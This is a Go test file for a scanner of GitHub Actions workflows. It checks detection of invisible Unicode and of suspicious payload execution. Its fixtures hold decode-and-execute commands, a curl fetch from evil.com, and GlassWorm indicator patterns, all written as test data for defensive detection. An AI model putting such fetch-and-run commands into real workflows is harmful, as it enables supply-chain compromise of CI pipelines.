package rules

import (
	"os"
	"path/filepath"
	"regexp"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/Vigilant-LLC/runner-guard/internal/parser"
)

// ---------------------------------------------------------------------------
// scanBytesForSuspiciousUnicode unit tests
// ---------------------------------------------------------------------------

func TestScanBytes_DetectsZeroWidthSpace(t *testing.T) {
	// 5 zero-width spaces (U+200B = 0xE2 0x80 0x8B in UTF-8)
	data := []byte("name: CI\n" +
		"on: push\n" +
		"jobs:\n" +
		"  build:\n" +
		"    runs-on: ubuntu-latest\n" +
		"    steps:\n" +
		"      - run: echo \xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b hello\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result, "expected suspicious Unicode to be detected")
	assert.Equal(t, 5, result.TotalCount)
	assert.Contains(t, result.CategoryMap, "zero-width space")
}

func TestScanBytes_DetectsVariationSelectors(t *testing.T) {
	// 4 variation selectors (U+FE00 = 0xEF 0xB8 0x80 in UTF-8)
	data := []byte("run: echo test\xef\xb8\x80\xef\xb8\x80\xef\xb8\x80\xef\xb8\x80\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result, "expected variation selectors to be detected")
	assert.Equal(t, 4, result.TotalCount)
	assert.Contains(t, result.CategoryMap, "variation selector")
}

func TestScanBytes_DetectsTagCharacters(t *testing.T) {
	// 3 tag characters (U+E0001 = 0xF3 0xA0 0x80 0x81 in UTF-8)
	data := []byte("run: echo\xf3\xa0\x80\x81\xf3\xa0\x80\x82\xf3\xa0\x80\x83 test\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result, "expected tag characters to be detected")
	assert.Equal(t, 3, result.TotalCount)
	assert.Contains(t, result.CategoryMap, "tag character")
}

func TestScanBytes_DetectsSupplementaryVariationSelectors(t *testing.T) {
	// 3 supplementary variation selectors (U+E0100 = 0xF3 0xA0 0x84 0x80)
	data := []byte("run: echo\xf3\xa0\x84\x80\xf3\xa0\x84\x80\xf3\xa0\x84\x80 test\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result, "expected supplementary variation selectors to be detected")
	assert.Equal(t, 3, result.TotalCount)
	assert.Contains(t, result.CategoryMap, "supplementary variation selector")
}

func TestScanBytes_IgnoresFE0FAfterEmoji(t *testing.T) {
	// U+FE0F (Variation Selector 16) after emoji base characters is standard
	// emoji presentation — NOT steganography. These should be ignored.
	// ⚠️ = U+26A0 + U+FE0F, ✅ = U+2705 + U+FE0F, ⚙️ = U+2699 + U+FE0F, 🛠️ = U+1F6E0 + U+FE0F
	data := []byte("name: CI\n" +
		"on: push\n" +
		"jobs:\n" +
		"  build:\n" +
		"    runs-on: ubuntu-latest\n" +
		"    steps:\n" +
		"      - name: Build \xe2\x9a\xa0\xef\xb8\x8f\n" + // ⚠️
		"        run: echo \xe2\x9c\x85\xef\xb8\x8f done\n" + // ✅ (U+2705 is in Dingbats)
		"      - name: Config \xe2\x9a\x99\xef\xb8\x8f\n" + // ⚙️
		"        run: echo \xf0\x9f\x9b\xa0\xef\xb8\x8f tools\n") // 🛠️

	result := scanBytesForSuspiciousUnicode(data, 1)
	assert.Nil(t, result, "FE0F after emoji base characters should not be flagged")
}

func TestScanBytes_FlagsFE0FWithoutEmoji(t *testing.T) {
	// U+FE0F NOT preceded by an emoji base should still be flagged as suspicious.
	// 3× FE0F after ASCII 'a' (not an emoji base).
	data := []byte("run: echo a\xef\xb8\x8fa\xef\xb8\x8fa\xef\xb8\x8f test\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result, "FE0F after non-emoji characters should be flagged")
	assert.Equal(t, 3, result.TotalCount)
	assert.Contains(t, result.CategoryMap, "variation selector")
}

func TestScanBytes_MixedEmojiAndSuspiciousFE0F(t *testing.T) {
	// Mix: 2 legitimate FE0F after emoji + 3 suspicious FE0F after ASCII.
	// Only the 3 suspicious ones should be counted.
	data := []byte("name: \xe2\x9a\xa0\xef\xb8\x8f\xe2\x9c\x85\xef\xb8\x8f\n" + // ⚠️✅ (legitimate)
		"run: echo x\xef\xb8\x8fy\xef\xb8\x8fz\xef\xb8\x8f\n") // x️y️z️ (suspicious)

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result, "suspicious FE0F should still be detected alongside legitimate emoji")
	assert.Equal(t, 3, result.TotalCount, "only non-emoji FE0F should be counted")
}

func TestScanBytes_IgnoresBOMAtPosition0(t *testing.T) {
	// BOM at position 0 should be ignored; only BOM elsewhere is suspicious
	data := []byte("\xef\xbb\xbfname: CI\non: push\n")

	result := scanBytesForSuspiciousUnicode(data, 1)
	assert.Nil(t, result, "BOM at position 0 should not be flagged")
}

func TestScanBytes_FlagsBOMNotAtPosition0(t *testing.T) {
	// BOM not at position 0 should be flagged
	data := []byte("name: CI\n\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbfon: push\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result, "BOM not at position 0 should be flagged")
	assert.Contains(t, result.CategoryMap, "byte order mark (not at file start)")
}

func TestScanBytes_CleanFile(t *testing.T) {
	data := []byte("name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hello\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	assert.Nil(t, result, "clean file should not trigger detection")
}

func TestScanBytes_BelowThreshold(t *testing.T) {
	// Only 2 zero-width spaces, below threshold of 3
	data := []byte("run: echo \xe2\x80\x8b\xe2\x80\x8b hello\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	assert.Nil(t, result, "count below threshold should not trigger")
}

func TestScanBytes_TracksLineNumbers(t *testing.T) {
	data := []byte("line1\nline2\nline3 \xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b here\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result)
	assert.Equal(t, 3, result.FirstLine, "should report line 3")
}

func TestFormatScanResult(t *testing.T) {
	data := []byte("run: echo \xef\xb8\x80\xef\xb8\x80\xef\xb8\x80 test\n")
	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result)

	formatted := formatScanResult(result, " in workflow file")
	assert.Contains(t, formatted, "3 invisible Unicode characters detected in workflow file")
	assert.Contains(t, formatted, "variation selector")
}

// ---------------------------------------------------------------------------
// RGS-016: Unicode Steganography in Workflow File
// ---------------------------------------------------------------------------

func TestRGS016_WorkflowWithInvisibleUnicode(t *testing.T) {
	// Build YAML with embedded zero-width spaces in the run block.
	yamlContent := "name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b hello\n"

	wf, err := parser.ParseBytes([]byte(yamlContent), ".github/workflows/ci.yml")
	require.NoError(t, err)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	var rgs016 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-016" {
			rgs016 = append(rgs016, f)
		}
	}

	require.NotEmpty(t, rgs016, "expected RGS-016 finding for invisible Unicode")
	assert.Equal(t, "critical", rgs016[0].Severity)
	assert.Contains(t, rgs016[0].Evidence, "invisible Unicode characters detected")
}

func TestRGS016_CleanWorkflow(t *testing.T) {
	yamlContent := "name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hello\n"

	wf, err := parser.ParseBytes([]byte(yamlContent), ".github/workflows/ci.yml")
	require.NoError(t, err)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	for _, f := range findings {
		assert.NotEqual(t, "RGS-016", f.RuleID, "clean workflow should not trigger RGS-016")
	}
}

// ---------------------------------------------------------------------------
// RGS-017: Unicode Steganography in Referenced Script
// ---------------------------------------------------------------------------

func TestRGS017_ReferencedSetupPyWithUnicode(t *testing.T) {
	// Create a temp directory mimicking a repo structure.
	tmpDir := t.TempDir()
	ghDir := filepath.Join(tmpDir, ".github", "workflows")
	require.NoError(t, os.MkdirAll(ghDir, 0o755))

	// Write a setup.py with invisible Unicode.
	setupContent := "from setuptools import setup\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\nsetup(name='test')\n"
	require.NoError(t, os.WriteFile(filepath.Join(tmpDir, "setup.py"), []byte(setupContent), 0o644))

	// Write a workflow that runs pip install.
	wfPath := filepath.Join(ghDir, "ci.yml")
	wfContent := "name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: pip install .\n"
	require.NoError(t, os.WriteFile(wfPath, []byte(wfContent), 0o644))

	wf, err := parser.ParseFile(wfPath)
	require.NoError(t, err)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	var rgs017 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-017" {
			rgs017 = append(rgs017, f)
		}
	}

	require.NotEmpty(t, rgs017, "expected RGS-017 finding for setup.py with Unicode")
	assert.Equal(t, "high", rgs017[0].Severity)
	assert.Contains(t, rgs017[0].Evidence, "setup.py")
}

func TestRGS017_CleanReferencedFile(t *testing.T) {
	tmpDir := t.TempDir()
	ghDir := filepath.Join(tmpDir, ".github", "workflows")
	require.NoError(t, os.MkdirAll(ghDir, 0o755))

	// Clean setup.py.
	require.NoError(t, os.WriteFile(filepath.Join(tmpDir, "setup.py"),
		[]byte("from setuptools import setup\nsetup(name='test')\n"), 0o644))

	wfPath := filepath.Join(ghDir, "ci.yml")
	wfContent := "name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: pip install .\n"
	require.NoError(t, os.WriteFile(wfPath, []byte(wfContent), 0o644))

	wf, err := parser.ParseFile(wfPath)
	require.NoError(t, err)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	for _, f := range findings {
		assert.NotEqual(t, "RGS-017", f.RuleID, "clean setup.py should not trigger RGS-017")
	}
}

func TestRGS017_LocalActionWithUnicode(t *testing.T) {
	tmpDir := t.TempDir()
	ghDir := filepath.Join(tmpDir, ".github", "workflows")
	actionDir := filepath.Join(tmpDir, ".github", "actions", "my-action")
	require.NoError(t, os.MkdirAll(ghDir, 0o755))
	require.NoError(t, os.MkdirAll(actionDir, 0o755))

	// action.yml with invisible Unicode.
	actionContent := "name: My Action\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\ndescription: test\nruns:\n  using: node20\n  main: index.js\n"
	require.NoError(t, os.WriteFile(filepath.Join(actionDir, "action.yml"), []byte(actionContent), 0o644))

	wfPath := filepath.Join(ghDir, "ci.yml")
	wfContent := "name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./.github/actions/my-action\n"
	require.NoError(t, os.WriteFile(wfPath, []byte(wfContent), 0o644))

	wf, err := parser.ParseFile(wfPath)
	require.NoError(t, err)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	var rgs017 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-017" {
			rgs017 = append(rgs017, f)
		}
	}

	require.NotEmpty(t, rgs017, "expected RGS-017 finding for local action.yml with Unicode")
	assert.Contains(t, rgs017[0].Evidence, "action.yml")
}

// ---------------------------------------------------------------------------
// RGS-018: Suspicious Payload Execution Pattern
// ---------------------------------------------------------------------------

func TestRGS018_PythonEvalBase64(t *testing.T) {
	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: python -c "eval(base64.b64decode('aW1wb3J0IG9z'))"
`)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	var rgs018 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-018" {
			rgs018 = append(rgs018, f)
		}
	}

	require.NotEmpty(t, rgs018, "expected RGS-018 for eval+base64 pattern")
	assert.Contains(t, rgs018[0].Evidence, "Python eval+decode")
}

func TestRGS018_Base64PipeToShell(t *testing.T) {
	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "aW1wb3J0IG9z" | base64 --decode | bash
`)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	var rgs018 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-018" {
			rgs018 = append(rgs018, f)
		}
	}

	require.NotEmpty(t, rgs018, "expected RGS-018 for base64 decode piped to shell")
	assert.Contains(t, rgs018[0].Evidence, "base64 decode piped to shell")
}

func TestRGS018_KnownIOCVariable(t *testing.T) {
	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: export lzcdrtfxyqiplpd=$(curl -s http://evil.com/payload)
`)

	engine := NewEngineWithDefaults()
	// Manually add the signature since NewEngineWithDefaults doesn't load signatures.yaml.
	engine.signatures = []*ThreatSignature{
		{
			ID:          "glassworm-marker-variable",
			ThreatActor: "GlassWorm",
			Description: "Known GlassWorm malware marker variable",
			compiled:    regexp.MustCompile(`\blzcdrtfxyqiplpd\b`),
		},
	}

	findings := engine.Evaluate([]*parser.Workflow{wf})

	var rgs018 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-018" {
			rgs018 = append(rgs018, f)
		}
	}

	require.NotEmpty(t, rgs018, "expected RGS-018 for known IOC variable")
	assert.Contains(t, rgs018[0].Evidence, "GlassWorm")
}

func TestRGS018_CleanBuildScript(t *testing.T) {
	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          npm install
          npm run build
          npm test
`)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	for _, f := range findings {
		assert.NotEqual(t, "RGS-018", f.RuleID, "normal build commands should not trigger RGS-018")
	}
}

func TestRGS018_JSEvalFromCharCode(t *testing.T) {
	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: node -e "var s = String.fromCharCode(72,101,108); eval(s)"
`)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	var rgs018 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-018" {
			rgs018 = append(rgs018, f)
		}
	}

	require.NotEmpty(t, rgs018, "expected RGS-018 for JS eval of fromCharCode")
}

// ---------------------------------------------------------------------------
// resolveReferencedFiles unit tests
// ---------------------------------------------------------------------------

func TestResolveReferencedFiles_PipInstall(t *testing.T) {
	tmpDir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(tmpDir, "setup.py"), []byte("setup()"), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(tmpDir, "pyproject.toml"), []byte("[build]"), 0o644))

	wf := &parser.Workflow{
		Path: filepath.Join(tmpDir, ".github", "workflows", "ci.yml"),
		Jobs: map[string]*parser.Job{
			"build": {
				Steps: []*parser.Step{
					{Run: "pip install ."},
				},
			},
		},
	}

	files := resolveReferencedFiles(wf, tmpDir)
	assert.NotEmpty(t, files, "should resolve setup.py and/or pyproject.toml")
}

func TestResolveReferencedFiles_NpmInstall(t *testing.T) {
	tmpDir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(tmpDir, "package.json"), []byte("{}"), 0o644))

	wf := &parser.Workflow{
		Path: filepath.Join(tmpDir, ".github", "workflows", "ci.yml"),
		Jobs: map[string]*parser.Job{
			"build": {
				Steps: []*parser.Step{
					{Run: "npm install"},
				},
			},
		},
	}

	files := resolveReferencedFiles(wf, tmpDir)
	assert.NotEmpty(t, files, "should resolve package.json")
}

func TestResolveReferencedFiles_NoFiles(t *testing.T) {
	tmpDir := t.TempDir()

	wf := &parser.Workflow{
		Path: filepath.Join(tmpDir, ".github", "workflows", "ci.yml"),
		Jobs: map[string]*parser.Job{
			"build": {
				Steps: []*parser.Step{
					{Run: "echo hello"},
				},
			},
		},
	}

	files := resolveReferencedFiles(wf, tmpDir)
	assert.Empty(t, files, "should find no referenced files for echo command")
}

func TestRepoRootFromWorkflowPath(t *testing.T) {
	tests := []struct {
		path     string
		expected string
	}{
		{"/repo/.github/workflows/ci.yml", "/repo"},
		{"/home/user/project/.github/workflows/build.yaml", "/home/user/project"},
		{"/random/path/file.yml", ""},
	}

	for _, tt := range tests {
		result := repoRootFromWorkflowPath(tt.path)
		assert.Equal(t, tt.expected, result, "for path %s", tt.path)
	}
}

// ---------------------------------------------------------------------------
// Signature loading
// ---------------------------------------------------------------------------

func TestSignatureRegexCompilation(t *testing.T) {
	// Verify the GlassWorm IOC patterns compile and match correctly.
	patterns := []struct {
		pattern string
		input   string
		match   bool
	}{
		{`\blzcdrtfxyqiplpd\b`, "export lzcdrtfxyqiplpd=foo", true},
		{`\blzcdrtfxyqiplpd\b`, "echo hello world", false},
		{`~/init\.json`, "cat ~/init.json", true},
		{`~/node-v22`, "ls ~/node-v22.1.0/bin", true},
		{`(?i)solana.*memo|memo.*solana`, "query solana memo field", true},
	}

	for _, tt := range patterns {
		re, err := regexp.Compile(tt.pattern)
		require.NoError(t, err, "pattern %q should compile", tt.pattern)
		assert.Equal(t, tt.match, re.MatchString(tt.input),
			"pattern %q against %q", tt.pattern, tt.input)
	}
}
